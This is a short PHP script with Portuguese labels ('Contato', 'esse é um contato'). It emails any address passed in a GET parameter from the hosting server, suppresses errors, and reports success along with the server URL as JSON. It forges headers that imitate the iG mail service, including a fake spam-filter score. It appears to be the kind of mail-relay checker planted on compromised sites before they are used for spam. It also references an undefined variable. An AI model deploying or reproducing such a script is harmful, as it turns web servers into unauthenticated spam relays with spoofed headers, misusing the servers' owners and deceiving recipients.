<?php
@set_time_limit(false);
@ini_set("display_errors", false);
$server = $_SERVER["SERVER_NAME"];
header('Content-type: application/json');
$to = $_GET["to"];
$from = 'contato@' . $server;
$fromnome = 'Contato';
$subject = 'Contato';
$html =     'esse é um contato';
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-Type: text/html; charset=UTF-8" . "\r\n";
$headers .= "Content-Transfer-Encoding: base64" . "\r\n";
$headers .= "X-Mailer: iGMail [www.ig.com.br]\r\n";
$headers .= "X-Originating-Email: $email[$i]\r\n";
$headers .= "X-Sender: $email[$i]\r\n";
$headers .= "X-iGspam-global: Unsure, spamicity=0.570081 - pe=5.74e-01 - pf=0.574081 - pg=0.574081\r\n";
$headers .= "From: " . $fromnome . " <" . $from . ">" . "\r\n";
if (mail($to, $subject, rtrim(chunk_split(base64_encode($html))), $headers)) {
    $data = ['enviado' => 'true', 'url' => $server];
    echo json_encode($data);
} else {
    $data = ['enviado' => 'false', 'url' => $server];
    echo json_encode($data);
}
